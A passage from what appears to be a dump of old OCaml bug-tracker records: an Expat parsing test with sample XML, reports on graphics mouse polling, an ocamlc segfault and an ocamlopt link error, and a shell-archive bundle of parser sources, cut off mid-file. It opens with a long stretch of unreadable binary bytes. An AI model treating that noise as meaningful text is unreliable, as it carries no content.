Ã¡Â¾\u0018cS\r\u001aÃÅ½|Â»Å\u001b.\tAÃªÃ³Â¸-Ã°Â®\u0014Ã±ÃÃ\u0004ÃÃÃÃÃÃÃºG$\u0006Â§Ã¶Ã½3|-v\u0006Â±Â¸Ã¦Ã¬Ã¤Ã¤â4uv~ÃÂ¿Kr\u0000Â²KË6Â½bÃ¾Â­ÃÃâ¢?[Â¤\u0002eÃ\u001eÂ¤\u0001ÃÃ?oÂ²\f\nÃâº\bÃÂ¿ÃÃÃmÃ·â\u0010\u0004â\bâ¬\u0004Ã°\u0000Ã¨Ã¤Â¤ÃÃ¯cÃ?A\u00073Â¦Ã¦W#\u00035Tâ\bÂ¬Ãu7'\u0001âÃ³Â¨VËÃ%j9Ã\u0013eBmÃ¡Ã¿ÃÃª$C+Å¾eÃ¯Ã¨?Â²e\u0014Â·\\\u001aÂ°ÅÂ¢a\rP?Ã¿Â¿MÂ½bf7\u001dÃ¢ÃQ^Ã¡4OX[ÃT?rÂ´~#\u0013txÂ¡\f_Ã²?ÃoÃÃ\u001câ¹Ã°+\u001cÃÂ¬|ÃÃâ\u0001Å¡ÅÃ²â\rÃ\u0010ÅHJÂ¶KÂ»eÃÂ¥HÃ¡Å¸Â´JÂªÃilÃ°Ã¡?\ro\u0011?Â´::rÃ´Ãâ3Â°Ã¹Â¥(\u0002`((Â§\u0000(\u0006Â³,Â²'ÃÃ¿ÃµÃ¤Â§âÂ²Ã©\u0012{A?ÃÃ¾ÃtYÃ¶Ã±\u0015ËjâIÃiÂ³Ã>lÂªT\u0001Â§ÃÃÃª Y\rÃÃ£Ã¦c?oÅ¾ÃÃ¿Ã¶Ã»Â§Â¯~ÃºÃ¡;ÃÃ­Ã~Ã¸Ã±âºÃ§ÃÅ¾Â²Ã¦h9Ã¾ÃµÃIÃâoÃMâd\u000e(â¡Ã¨Ã¿â¦Â°â¹9\u000bÃ²_â¢Â¶\u0018Â»@ÃÃ´Ã[ÃEÅ \u0016\u001dÃ®â 6ÅÃâ B?uTÃ\t\u001câÃfpÃÂ§T`Ã¤Ã«âÃ7Â¥<?Ã±u\tÃ/ÃsÃb\u001d_@R\u0019>tÃÃ¢AâÃ RAâÃ¢Â¹Â Ãª\u0001Ã\t3Â®.Â°â°C>\u0010Â±Â¿Â¨[PÃ+({xÃÃ¾Ãª#\u00119\u0018?]Å½Ã´Ã®.GâºpÃÃ¹g\u0007Â¿Â§Ã¼ÆcÂ¾Â»K\u000fÃÃ¯dTÅ¡Ã¢'\u0007j\u0014Ã®O}Â§ZÃ®RÃâ\u0019Ãj<â¦Â¨Â¯nÃªVJF\u001e\"6Â¾Ã?)9\u0012P$\bÃ¬B6Â£Â­\u0000Ã·Ã¸Ã rJÃ¾Ã»Â°=ÃL&\u0017ÃÃ¤ÃÃ³Â¥ZÃa\u0001ËÃ©Â¶CÂ²}P\u001dÅ¸,âÃu\u001bÂ¢â°Ã³:9OËÃ­Â£ Ã (Âºb\u000f Å¾Ã­\u001eÃ\u0015Â¶ZjÅ Ã³Â¶ Â©Ã)\u0003;Ã\u000bÃ¸ÃÃ¨Â¤ÃÃ\u000e8B5Â¬ÃÂ¢CeÃ\u0004ÃÃ;Ã¤@â¹?RZÂ \tÃ´dÃ¢d\b+Ã²p2Ã§Ã³\u000ewÃ¹Å¸Â¸\u0015\u001eËË?-Ã«z^eÃâ¬NÃ¦Ã³\u0005\u001by\u0006Ã\u001d.Ã¨â Ã¤r4Â¢Ã·MpG4`wâÃ·ââÂ±\u0015Â§\u0019ÃpÂ©1GÃ¡Ã-â\u001eÂ¢NÂ¯Â¼NÂºâ¢NÂ¯Âµm\u001dÅ¾oÃ+\u001aâÃ®C\t?Å¾ÃÃâº*_Ã°â¹Ã=ÃÃâ¢Ã\nÃÃÂ»&Ãªq\u0005?Å¾\rÂ¢Ãx?YÂ»,2\u0007(ÃX\u0000Ã+âÃÂ¡Câ¡}Â¥Ãâ \u0000Ã½=Ã«?Å½Ë.Ã­Ã?(Ã®Â¤\\Ã¹Ã¨ZÃG\u0015ËÅ¾\u0003SÂªÂ³tKââ\nMÃ´Jâº?Ã¿[Ã¦â¢B\u0010qâ\u0017ÂªQâÃ¶N%\u001cp\u0018Ã§\u0010=Zâ°\u000b\u0001z\u000f[Â¼Ãâ¢WÃ«zÂ¬â¢SÃ Â¥iWI?nâ¦â\tÃÃ§FÅV\u0016Ã¸\u001fÂ¾KD!Ã?ÃÂ³8W?1\u0003\u0001Å¾\u0018\u0012\u0014Ã¸ÃÃ±ÃÂ«TÃT[Ã°fÃ£Â´â°\u0016â¡yÃÃ³&zÂ¦?6Âµ;?Â¾\u0004Ã¡ÂºÃÃ¢`<;XÂ¿Ã\u000eÂ¦Ã£â?Â¹(â¢?\u000e\u0012|âºÅ¸Å6\u0007Mqâ\rNâºÃ&\u001bÅ¾6SuÃ«ÃªÂ´yÂ­5\bÃÃy~tY<\tÂ¢âX}Â»â¢Ãz6XÃRâÂ¤Â¡Ã¦ËÃ4Ã¹\u0006srÂ°XÃÃ§#2Ãâ\u0014{Xâ¬9Ã¶âÃ\u0002Â¤N\u0001\u0003dXÃÃTÅ½)Ã«ÆÃÂ¶7MfÂ¼|Ã­\u0005?Ær\u0000? Ã½|Ã\u0017Â©ÃµÃ¤\u001a}&\u00158'+Ã¾\u0010âÃËÂ¤eÃÃl2\u001e@Â®Ãlr\rÃ®\bÃÅ<p]\u0005cÂ¥Å¡Â t}\u001c\u000fÃ°Â Â¼\u0006â¹Â°KÃ¶Kâ-VlÂ¹â¢Ã0X+Ã\u0010Ã­U8[\u0003Â±@\u0000âdÂµâ \u0007Ã\u0011Ã¡Ã\u0010Ã¬|Ã°v<ÃÂ¬8\u0002hÂ­ÃÃÂ­%`}Tk`\u0017Â³Ã·?K{pÂ±$ÃWÅ½Ã`Â¾ÃÃÃ£+T934ÃÃ\n\u0000#Â¿â¹Æ*ÂªÃ¸dyÃFÃÃÅ½ÃÂ¢Ã?Â¨ÃÃÃ2Ã°gÃ[Ãg?nÃ\"\u0007-?Â¸R.Ã?ÃÃÂ¬Ã7\u001fÃ§ÃTÂ®\u0007a*\u0015\u0016AkÃ$)Ã,ÃÂ§ÃÃÃÃÅ¡Ã¡Âª%ÅÂ©Â£Ã\u0006Ã²\u0010ÃÃâÃÂ«6Â¯Ã¸Â¶\u001d\u001dÂ¶ÃÂ°âº?IÃ¬ÃiâÃÂ§\u0002H'zâÂ¬Â¸F;âÃ³dÂ®Â¼Â±ËOÃ\u0005Â wÂ±^Â³Ã\u0005ÃÃ±}â°(Å¡Ãs\r\fÃ¦\n;ÃÂ®Ã¸CvwÃ¤ÃµG;\u0014mÂ¯Ã­ÂµÂ½Â¶ÃÃ¶Ã^Ãk{mÂ¯Ã­ÂµÂ½Â¶ÃÃ¶Ã^Ãk{mÂ¯Ã­ÂµÂ½Â¶ÃÃ¶Ãº$Â®Ã¿\u0001Â â#$\u0000Ã°\u0000\u0000----------------\nlet buflen = 1024\nlet buf = String.create buflen\n\nlet x = ref [ 1 ; 2 ]\n\nlet load_expat s =\n  let ic = open_in s in\n  let p = Expat.parser_create \"\" in \n  Expat.set_start_element_handler p \n    (fun name att -> x := [ 2 ]; Printf.printf \"start=%s\\n\" name); \n  let rec loop () =\n    let n = input ic buf 0 buflen in\n    if (n > 0) then \n      (Expat.parse_sub p buf 0 n; \n       loop ())\n  in\n  loop();\n  (* Expat.final p;  *)\n  close_in ic\n\nlet () = \n  while true do \n    Printf.printf \"Bla\\n\"; \n    flush stdout; \n    load_expat \"bug.xml\"\n  done\n;;\n(* let () = load_expat Sys.argv.(1) *)\n\n\n----------------\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><addrbook><person><name>XNRFRJGQKHCOYMALTIVE</name><tel>XKJAOPQLNDMHLLOESQLB</tel></person><person><name>IZFUHLWMFPSQDXPGJQWX</name><tel>RSNCCSQKUORDLRRIWOUF</tel><email>RUJWFUEODGQHFYBLYRTK</email><email>RWAXVLHROCHBFZBLVUQJ</email><email>KABTPSWDWBUTQTOMTQBT</email></person><person><name>KLPIFFSOSFUIFIRUOKAF</name><tel>BKSVVNYPQEFFTRDTHVVX</tel><email>ZPJZNEDORTFZLTGQGIVK</email><email>TXYZZMPAPLOZUXOLWMXS</email></person><person><name>RUPDYZJLLCRCSVDYBMZQ</name><email>BZQTYVFDWLQYNFKHKKOG</email><email>CVGRLVJBPZRYFHBNMRQF</email><email>WBAEVQQNWPSPZXWMIZIN</email></person><person><name>IWPBGRLZKAMUZOYXLKSH</name><tel>PQOWNYNUJAUBFGQGLRFE</tel></person><person><name>VJRQMKHOHUCYBEXNOOAZ</name><email>TGKFNPCPANQDTQMDPFHK</email></person><person><name>VPMYGIEGKYQXWFOSTCNH</name><email>XVCBVMGJYJOTJZCOZLBS</email></person><person><name>AWGSVMSZKEQSFXQVYMRC</name><email>RZKYHBDUUBDVDGHUATEK</email><email>BDGSOVZHECXGFKIBTYUA</email></perso\n n><person><name>OBNHYMFEOCKGFJETUXTZ</name><email>OZZZWKEPIOIRFZDLWQLJ</email><email>NXZPZNVBAYMINNOJFCPN</email></person><person><name>GKHPTWIOJFUGWQDNAUOK</name><tel>ELVPWOKPSMQASYUTVRWG</tel><email>VKODJNHCTBUAIVGJZWOU</email><email>SJLGODZIJGJJUKVUIWMV</email><email>LXGULUBLEVPJFRVJNNZG</email></person></addrbook>\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1735\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nWindows XP, ocaml 3.06, graphics library\n\nCompile and run the following program as (graphics > out), then click and \nhold the mouse button in the window, then hit esc, then look in out.  You \nwill see the first event having the mouse button down, and then a bunch of \nbutton:false's, and then button:trues again.  It looks like the first 200 \nor so Poll'ed button reads after a mouse down return false even though the \nbutton is still down, and then it starts returning true again.  If you're \nalways just polling (set dopoll=true) then the reading is correct always.\n\nChris\n\n(* ocamlc -o graphics.exe unix.cma graphics.cma graphtest.ml *)\n\nopen Graphics\n\nlet print_event e =\n   Printf.printf \"x:%d y:%d button:%b keypressed:%b key:%c\\n\" e.mouse_x \ne.mouse_y e.button e.keypressed e.key;\n   flush stdout\n\nlet _ =\n   open_graph \"\";\n   set_color white;\n   clear_graph ();\n   set_color black;\n   plot 50 50;\n   let quit = ref false in\n   let dopoll = ref false in\n   while not !quit do\n     let e = wait_next_event (if !dopoll then [Poll] else [Button_down; \nKey_pressed]) in\n     dopoll := true;\n     print_event e;\n     match e.key with\n       'q' | '\\027' -> quit := true\n     | 'p' -> dopoll := false\n     | _ -> ()\n   done;\n   close_graph ();\n   ()\n"},{"labels":["bug"],"text":"**Original bug ID:** 1734\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nDear Camllists,\n\nI hope this is another false alarm and I am just doing something stupid.\n\nA large program compiled with ocamlc segfaults.  I know that a program\ncompiled with ocamlopt can segfault if it runs out of stack, but I\nbelieve this is not supposed to be possible with ocamlc.\n\nWhen I run the program using ocamldebug, I get\n\n  Lost connection with process 3014 (active process)\n  between time 3190000 and time 3200000\n  Trying to recover...\n\nWhen I run the program under gdb, I get the following output:\n\n  : nr@labrador 2314 ; gdb ../bin/qc--\n  gdb: Symbol `emacs_ctlx_keymap' has different size in shared object, consider re-linking\n  GNU gdb 2002-04-01-cvs\n  Copyright 2002 Free Software Foundation, Inc.\n  GDB is free software, covered by the GNU General Public License, and you are\n  welcome to change it and/or distribute copies of it under certain conditions.\n  Type \"show copying\" to see the conditions.\n  There is absolutely no warranty for GDB.  Type \"show warranty\" for details.\n  This GDB was configured as \"i386-linux\"...(no debugging symbols found)...\n  (gdb) run testdrv.lua all.dummy.tst\n  Starting program: /amd/lair60/vol/vol0/home/nr/c--/qc--/bin/qc-- testdrv.lua all.dummy.tst\n  (no debugging symbols found)...(no debugging symbols found)...\n  (no debugging symbols found)...(no debugging symbols found)...[New Thread 16384 (LWP 3336)]\n  \n  (no debugging symbols found)...(no debugging symbols found)...       [ 75.76 % ]\n  Program received signal SIGSEGV, Segmentation fault.\n  [Switching to Thread 16384 (LWP 3336)]\n  0x0805f57b in alloc_channel ()\n  (gdb) bt\n  #0  0x0805f57b in alloc_channel ()\n  #1  0x0805f626 in caml_out_channels_list ()\n  #2  0x08067566 in interprete ()\n  #3  0x080686a1 in caml_main ()\n  #4  0x0805ad1c in main ()\n  #5  0x400e6a51 in __libc_start_main () from /lib/libc.so.6\n  (gdb) \n\nPlease let me know how I can provide more information that might help\nyou (or me) diagnose and repair this problem.\n\n\nNorman\n"},{"labels":["bug"],"text":"**Original bug ID:** 1732\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nDear Camllists,\n\nWe just moved from version 3.04 to 3.06, and unfortunately we have\nfound a bug in ocamlopt.  I'm not sure what the problem is, but I have\nprepared a bundle that I hope will enable you to duplicate it.\n\nThe bundle at the bottom of this mail contains some Caml source code\nand a shell script called `buildme'.  As you will see from the\ntranscript below, if I run `buildme' with the 3.06 compiler, it fails\nin the linking step.  If I run it with the 3.04 compiler, it links\nwithout error.\n\nI will be hopeful that you can provide a patch or suggest a\nworkaround. \n\n\nNorman\n\n\n  : nr@labrador 1666 ; sh /tmp/bb\n  lc.mli\n  rc_ast.mli\n  rc_parse.mli\n  pc.mli\n  pp.mli\n  rx.mli\n  srcmap.mli\n  verbose.mli\n  lc.ml\n  rc_ast.ml\n  rc.mli\n  pc.ml\n  pp.ml\n  rx.ml\n  srcmap.ml\n  verbose.ml\n  rc_parse.ml\n  rc_scan.ml\n  rc.ml\n  buildme\n  : nr@labrador 1667 ; sh buildme\n  Files rc_parse.cmx and rc.cmx both define a module named Rc_parse\n  : nr@labrador 1668 ; rm *.cm?\n  : nr@labrador 1669 ; PATH=/usr/local/ocaml-3.04/bin:$PATH sh buildme\n  : nr@labrador 1670 ;\n  : nr@labrador 1675 ; uname -a\n  Linux labrador 2.4.18 #22 SMP Tue Jul 9 10:45:21 EDT 2002 i686 Pentium III (Katmai) GenuineIntel GNU/Linux\n\n\n# To unbundle, \"sed '1,/^# To unbundle/d' < thisfile | sh\"\n# To unbundle, make sure both lines appear in the file\n# Thu Jun 26 12:31:58 EDT 2003\necho lc.mli 1>&2\nsed 's/^-//' >'lc.mli' <<'End of lc.mli'\n-# 25 \"lc.nw\"\n-exception Error of string\n-# 32 \"lc.nw\"\n-type 'a lexer\n-# 42 \"lc.nw\"\n-val succeed : 'a lexer\n-# 47 \"lc.nw\"\n-val fail : string -> 'a\n-# 52 \"lc.nw\"\n-val any : 'a lexer\n-# 58 \"lc.nw\"\n-val eof : 'a lexer\n-# 64 \"lc.nw\"\n-val satisfy : (char -> bool) -> 'a lexer\n-# 70 \"lc.nw\"\n-val chr : char -> 'a lexer\n-# 76 \"lc.nw\"\n-val str : string -> 'a lexer\n-# 82 \"lc.nw\"\n-val ( *** ) : 'a lexer -> 'a lexer -> 'a lexer\n-val seq     : 'a lexer -> 'a lexer -> 'a lexer\n-# 91 \"lc.nw\"\n-val ( ||| ) : 'a lexer -> 'a lexer -> 'a lexer\n-val alt     : 'a lexer -> 'a lexer -> 'a lexer\n-# 98 \"lc.nw\"\n-val many : 'a lexer -> 'a lexer\n-# 106 \"lc.nw\"\n-val some : 'a lexer -> 'a lexer\n-# 112 \"lc.nw\"\n-val opt : 'a lexer -> 'a lexer\n-# 118 \"lc.nw\"\n-val save : (string -> int -> int -> 'a) -> 'a lexer -> 'a lexer\n-# 153 \"lc.nw\"\n-val saveStr : string lexer -> string lexer\n-# 160 \"lc.nw\"\n-val scan: string -> 'a lexer -> (int * 'a list)\n-# 167 \"lc.nw\"\n-val scanFrom : int -> string -> 'a lexer -> (int * 'a list)\nEnd of lc.mli\necho rc_ast.mli 1>&2\nsed 's/^-//' >'rc_ast.mli' <<'End of rc_ast.mli'\n-# 126 \"rc.nw\"\n-type id         = string\n-\n-type rc         =\n-                | RCstr         of string\n-                | RCbool        of bool\n-                | RCint         of int\n-                | RCfloat       of float\n-                | RClist        of rc list\n-# 140 \"rc.nw\"\n-type rcdict\n-# 147 \"rc.nw\"\n-val find        : id -> rcdict -> rc \n-# 156 \"rc.nw\"\n-val empty       : rcdict \n-# 162 \"rc.nw\"\n-val add         : id -> rc -> rcdict -> rcdict \n-# 168 \"rc.nw\"\n-val asList      : rcdict -> (id * rc) list\nEnd of rc_ast.mli\necho rc_parse.mli 1>&2\nsed 's/^-//' >'rc_parse.mli' <<'End of rc_parse.mli'\n-type token =\n-    STR of (string)\n-  | ID of (string)\n-  | BOOL of (bool)\n-  | FLOAT of (float)\n-  | INT of (int)\n-  | COMMA\n-  | EQUAL\n-  | TRUE\n-  | FALSE\n-  | EOF\n-\n-val rcfile :\n-  (Lexing.lexbuf  -> token) -> Lexing.lexbuf -> Rc_ast.rcdict\nEnd of rc_parse.mli\necho pc.mli 1>&2\nsed 's/^-//' >'pc.mli' <<'End of pc.mli'\n-# 60 \"pc.nw\"\n-type ('t, 'v) par   = 't list -> 'v * 't list\n-\n-exception Error     of string\n-\n-# 74 \"pc.nw\"\n-val fail:       string -> 'a\n-val succeed:    'v -> ('t,'v) par \n-\n-# 81 \"pc.nw\"\n-val any: ('t,'t) par\n-\n-# 87 \"pc.nw\"\n-val eof: ('t,bool) par\n-\n-# 95 \"pc.nw\"\n-val satisfy: ('t -> bool) -> ('t,'t) par\n-\n-# 103 \"pc.nw\"\n-val literal: 't -> ('t,'t) par\n-\n-# 144 \"pc.nw\"\n-val ( *** ): ('t,'v1) par -> ('t,'v2) par -> ('t,('v1*'v2)) par \n-\n-# 154 \"pc.nw\"\n-val ( **< ): ('t,'v1) par -> ('t,'v2) par -> ('t,'v1) par \n-val ( **> ): ('t,'v1) par -> ('t,'v2) par -> ('t,'v2) par \n-\n-# 163 \"pc.nw\"\n-val ( ||| ): ('t,'v)  par -> ('t,'v)  par -> ('t,'v)  par \n-\n-# 173 \"pc.nw\"\n-val ( --> ): ('t,'v1) par -> ('v1 -> 'v2) -> ('t,'v2) par\n-\n-# 181 \"pc.nw\"\n-val return: 'v1 -> 'v2 -> 'v1\n-\n-# 195 \"pc.nw\"\n-val opt: ('t,'v)  par -> ('t,'v option) par\n-\n-# 214 \"pc.nw\"\n-val some: ('t,'v)  par -> ('t,'v list) par\n-\nEnd of pc.mli\necho pp.mli 1>&2\nsed 's/^-//' >'pp.mli' <<'End of pp.mli'\n-# 50 \"pp.nw\"\n-type doc\n-\n-# 56 \"pp.nw\"\n-val empty : doc\n-\n-# 63 \"pp.nw\"\n-val (^^) : doc -> doc -> doc\n-\n-# 70 \"pp.nw\"\n-val text : string -> doc\n-\n-# 81 \"pp.nw\"\n-val break : doc\n-\n-# 88 \"pp.nw\"\n-val breakWith : string -> doc\n-\n-# 103 \"pp.nw\"\n-val nest : int -> doc -> doc\n-\n-# 117 \"pp.nw\"\n-val hgrp : doc -> doc\n-    \n-# 128 \"pp.nw\"\n-val vgrp : doc -> doc\n-\n-# 149 \"pp.nw\"\n-val agrp : doc -> doc\n-\n-# 158 \"pp.nw\"\n-val fgrp : doc -> doc\n-\n-# 181 \"pp.nw\"\n-val ppToString : int -> doc -> string\n-val ppToFile : out_channel -> int -> doc -> unit\n-# 201 \"pp.nw\"\n-val list      : doc -> ('a -> doc) -> 'a list -> doc \n-val commalist :        ('a -> doc) -> 'a list -> doc\n-\n-# 209 \"pp.nw\"\n-val (^/)      : doc -> doc -> doc\n-\n-# 216 \"pp.nw\"\n-val block     : ('a -> doc) -> 'a list -> doc\nEnd of pp.mli\necho rx.mli 1>&2\nsed 's/^-//' >'rx.mli' <<'End of rx.mli'\n-# 29 \"rx.nw\"\n-type 'a rx \n-# 35 \"rx.nw\"\n-val zero : 'a rx                                (* never matches       *)\n-val unit : 'a rx                                (* matches empty input *)\n-val sym : 'a -> 'a rx                           (* 'x'                 *)\n-val many : 'a rx -> 'a rx                       (* e*                  *)\n-val some : 'a rx -> 'a rx                       (* e+                  *)\n-val opt : 'a rx -> 'a rx                        (* e?                  *)\n-val seq : 'a rx -> 'a rx -> 'a rx               (* e1 e2               *)\n-val alt : 'a rx -> 'a rx -> 'a rx               (* e1 | e2             *)\n-val ( ||| ) : 'a rx -> 'a rx -> 'a rx           (* e1 | e2             *)\n-val ( *** ) : 'a rx -> 'a rx -> 'a rx           (* e1 e2               *)\n-# 51 \"rx.nw\"\n-val matches : 'a rx -> 'a list -> bool\n-# 58 \"rx.nw\"\n-val matchstr : char rx -> string -> bool\nEnd of rx.mli\necho srcmap.mli 1>&2\nsed 's/^-//' >'srcmap.mli' <<'End of srcmap.mli'\n-# 90 \"srcmap.nw\"\n-type pos            = int\n-type rgn            = pos * pos\n-# 97 \"srcmap.nw\"\n-val null            : rgn\n-# 108 \"srcmap.nw\"\n-type location       = string    (* file   *)\n-                    * int       (* line   *)\n-                    * int       (* column *)\n-# 118 \"srcmap.nw\"\n-type map\n-val mk:             unit -> map (* empty map *)\n-# 131 \"srcmap.nw\"\n-val sync :          map -> pos -> location -> unit\n-val nl :            map -> pos -> unit\n-# 138 \"srcmap.nw\"\n-val last :          map -> location\n-# 145 \"srcmap.nw\"\n-val location :      map -> pos -> location\n-val dump:           map -> unit\n-# 152 \"srcmap.nw\"\n-type point          = map * pos\n-type region         = map * rgn\n-# 158 \"srcmap.nw\"\n-module Str:\n-sig\n-    val point       : point  -> string\n-    val region      : region -> string\n-end\nEnd of srcmap.mli\necho verbose.mli 1>&2\nsed 's/^-//' >'verbose.mli' <<'End of verbose.mli'\n-# 13 \"verbose.nw\"\n-val say : int -> string list -> unit\n-  (* if VERBOSITY >= k, then say k l writes every string in l to stderr *)\n-val verbosity : int  (* current verbosity *)\nEnd of verbose.mli\necho lc.ml 1>&2\nsed 's/^-//' >'lc.ml' <<'End of lc.ml'\n-# 178 \"lc.nw\"\n-exception Error of string\n-let error msg           = raise (Error msg)\n-\n-let strlen              = String.length     (* string -> int         *)\n-let get                 = String.get        (* string -> int -> char *)\n-\n-\n-type region             = int * int\n-# 194 \"lc.nw\"\n-type 'a lexer           = string -> int -> 'a list -> (int * 'a list)\n-\n-(* naming convention: str=actual input, x=current position in str,\n-   r=region list (all regions saved by the [save] lexer) *)\n-\n-let succeed str x r     = (0,r)\n-\n-# 202 \"lc.nw\"\n-let fail msg            = error msg\n-\n-# 205 \"lc.nw\"\n-let any                 = fun str x r -> \n-                          if x < strlen str \n-                          then (1,r)\n-                          else fail \"unexpected eof\"\n-\n-# 211 \"lc.nw\"\n-let eof                 = fun str x r ->         \n-                          if x = strlen str\n-                          then (0,r)\n-                          else fail \"eof expected\"\n-\n-# 217 \"lc.nw\"\n-let satisfy f           = fun str x r ->\n-                          if x < strlen str && f (get str x)\n-                          then (1,r)\n-                          else fail \"predicate failed\"\n-\n-# 223 \"lc.nw\"\n-let chr c               = satisfy ((=) c)\n- \n-# 226 \"lc.nw\"\n-let str s               = fun st x r ->    \n-                          let l = strlen s in\n-                          let rec loop i =\n-                              if   i = l \n-                              then (l,r)\n-                              else if s.[i] = st.[x+i]\n-                                  then loop (i+1)\n-                                  else fail \"str failed\"\n-                              in \n-                                  loop 0\n-\n-# 238 \"lc.nw\"\n-let seq  l1 l2          = fun str x r ->\n-                          let (i1,r1) = l1 str  x     r    in\n-                          let (i2,r2) = l2 str (x+i1) r1   in\n-                              (i1+i2,r2)\n-let ( *** ) = seq\n-\n-                              \n-# 246 \"lc.nw\"\n-let alt l1 l2           = fun str x r ->\n-                          try l1 str x r with\n-                              Error _ -> try l2 str x r with\n-                                  Error _ -> fail \"(x ||| y) failed\"\n-\n-                          (* the fun below seems superficial but it is\n-                             not: it prevents endless recursion in \n-                             definitions like \"let word = many any\"\n-                             which are caused by strict evaluation\n-                             *)\n-let (|||) = alt\n-\n-# 259 \"lc.nw\"\n-let rec many l          = fun str x r ->\n-                          (l *** many l ||| succeed) str x r \n-\n-# 263 \"lc.nw\"\n-let some l              = l *** many l\n-\n-# 266 \"lc.nw\"\n-let opt l               = l ||| succeed\n-\n-# 269 \"lc.nw\"\n-let save f l            = fun str x r ->\n-                          let (i,r') = l str x r   in\n-                              (i,f str x i :: r')\n-\n-# 274 \"lc.nw\"\n-let saveStr l           = save String.sub l\n-                              \n-(* auxilary functions *)\n-\n-let scanFrom x str lexer    = lexer str x []    \n-let scan str lexer          = lexer str 0 [] \nEnd of lc.ml\necho rc_ast.ml 1>&2\nsed 's/^-//' >'rc_ast.ml' <<'End of rc_ast.ml'\n-# 172 \"rc.nw\"\n-type id         =       string\n-\n-type rc         =\n-                | RCstr of string\n-                | RCbool of bool\n-                | RCint of int\n-                | RCfloat of float\n-                | RClist of rc list\n-\n-module IdMap    = \n-    Map.Make(struct type t=id let compare=Pervasives.compare end)\n-\n-(* rc files are maps (or dictinoaries) which map identifiers \n-   to values (of type rc from above) *)\n-                \n-type rcdict     =       rc IdMap.t\n-\n-\n-let empty               = IdMap.empty\n-let find                = IdMap.find\n-let add                 = IdMap.add\n-\n-(* [asList dictfile] returns the contents of [dictfile] as a lsit of\n-   id/rc pairs. This is for debugging only *)\n-\n-let asList dict =\n-    let insert id rc list = (id,rc)::list       in\n-        IdMap.fold insert dict []\nEnd of rc_ast.ml\necho rc.mli 1>&2\nsed 's/^-//' >'rc.mli' <<'End of rc.mli'\n-# 57 \"rc.nw\"\n-type id         = Rc_ast.id\n-type rc         = Rc_ast.rc\n-type rcdict     = Rc_ast.rcdict\n-\n-exception       Error of string         (* reports parse/scan errors *)\n-# 68 \"rc.nw\"\n-val find        : id -> rcdict -> rc \n-# 74 \"rc.nw\"\n-val read        : string -> rcdict\nEnd of rc.mli\necho pc.ml 1>&2\nsed 's/^-//' >'pc.ml' <<'End of pc.ml'\n-# 230 \"pc.nw\"\n-exception Error of string\n-let error s = raise (Error s)\n-\n-type ('t,'v) par = 't list -> 'v * ('t list)\n-# 241 \"pc.nw\"\n-let succeed v ts = (v,ts)\n-let fail msg     = error msg\n-\n-let any = function\n-    | []        -> fail \"token expected but none found\"\n-    | t::ts     -> succeed t ts\n-\n-let eof = function\n-    | []        -> succeed true []\n-    | _         -> fail \"end of input expected but token found\"\n-\n-let satisfy f = function \n-    | []        -> fail \"satisfy parser: no input\" \n-    | t::ts     -> if f t \n-                   then succeed t ts\n-                   else fail \"token does not satisfy predicate\"\n-\n-let literal x = satisfy ((=) x)\n-\n-# 299 \"pc.nw\"\n-let ( ||| ) p1 p2 = fun ts ->\n-    try p1 ts with \n-    Error _ ->  try p2 ts with\n-                Error _ -> fail \"all alternatives failed\"\n-\n-let ( --> ) p f = fun ts ->\n-    let (v,ts') = p ts \n-    in (f v, ts')\n-\n-let return x = fun _ -> x\n-\n-let ( *** ) p1 p2 = fun ts -> \n-    let (v1,ts1) = p1 ts  in\n-    let (v2,ts2) = p2 ts1 in\n-        ((v1,v2),ts2)\n-\n-let ( **> ) p1 p2 =\n-    p1 *** p2 --> snd\n-\n-let ( **< ) p1 p2 =\n-    p1 *** p2 --> fst\n-\n-let rec many p = fun ts ->\n-    (      p *** (many p) --> (fun (x,y)->x::y)\n-        ||| succeed []\n-    ) ts \n-\n-let opt p =\n-        p --> (fun x -> Some x)\n-    ||| succeed None\n-\n-let some p =\n-    p *** many p --> (fun (x,y) -> x::y)\n-\nEnd of pc.ml\necho pp.ml 1>&2\nsed 's/^-//' >'pp.ml' <<'End of pp.ml'\n-# 462 \"pp.nw\"\n-let debug   = false \n-let strlen  = String.length\n-\n-# 470 \"pp.nw\"\n-let nl      = \"\\n\"\n-\n-# 244 \"pp.nw\"\n-type gmode =\n-    | GFlat             (* hgrp *)\n-    | GBreak            (* vgrp *)\n-    | GFill             (* fgrp *)\n-    | GAuto             (* agrp *)\n-\n-\n-# 230 \"pp.nw\"\n-type doc =\n-    | DocNil\n-    | DocCons           of doc * doc\n-    | DocText           of string\n-    | DocNest           of int * doc\n-    | DocBreak          of string\n-    | DocGroup          of gmode * doc\n-\n-\n-# 256 \"pp.nw\"\n-let (^^) x y            = DocCons(x,y)\n-let empty               = DocNil\n-let text s              = DocText(s)\n-let nest i x            = DocNest(i,x)\n-let break               = DocBreak(\" \")\n-let breakWith s         = DocBreak(s)\n-\n-let hgrp d              = DocGroup(GFlat, d)\n-let vgrp d              = DocGroup(GBreak,d)\n-let agrp d              = if   debug\n-                          then DocGroup(GAuto, text \"[\" ^^ d ^^ text \"]\")\n-                          else DocGroup(GAuto, d)\n-let fgrp d              = if   debug\n-                          then DocGroup(GFill, text \"{\" ^^ d ^^ text \"}\")\n-                          else DocGroup(GFill, d)\n-                          \n-# 286 \"pp.nw\"\n-type sdoc =\n-    | SNil\n-    | SText             of string * sdoc\n-    | SLine             of int    * sdoc    (* newline + spaces *)\n-\n-# 303 \"pp.nw\"\n-let sdocToString sdoc =\n-    let buf = Buffer.create 256 in\n-    let rec loop = function\n-        | SNil              -> ()\n-        | SText(s,d)        -> ( Buffer.add_string buf s\n-                               ; loop d\n-                               )\n-        | SLine(i,d)        -> let prefix = String.make i ' ' in\n-                               ( Buffer.add_char   buf '\\n'\n-                               ; Buffer.add_string buf prefix\n-                               ; loop d\n-                               )\n-    in\n-        ( loop sdoc\n-        ; Buffer.contents buf\n-        )\n-\n-let sdocToFile oc doc = \n-    let pstr = output_string oc in\n-    let rec loop = function\n-        | SNil          -> () \n-        | SText(s,d)    -> pstr s; loop d\n-        | SLine(i,d)    -> let prefix = String.make i ' ' \n-         